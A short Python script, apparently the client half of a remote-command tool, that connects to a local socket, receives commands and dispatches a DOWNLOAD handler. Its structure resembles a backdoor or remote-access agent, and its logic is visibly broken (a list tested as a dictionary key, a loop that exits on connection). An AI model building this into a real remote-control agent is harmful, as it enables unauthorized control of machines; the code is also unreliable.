import socket
import subprocess
from Communicator import COMMUNICATOR
from Downloader import Download

ALL_ACTIONS = {
        b'DOWNLOAD': Download
}

if __name__ == "__main__":
        sock = socket.socket()
        sock.connect(("127.0.0.1", 8080))
        sock = COMMUNICATOR(sock)
        while True:
                d = sock.recv()
                if sock.IsConnected:
                        break
                dlist = d.split(b' ') # split all arguments/commands
                if dlist in ALL_ACTIONS:
                        ALL_ACTIONS[dlist[0]](sock, d) # caal function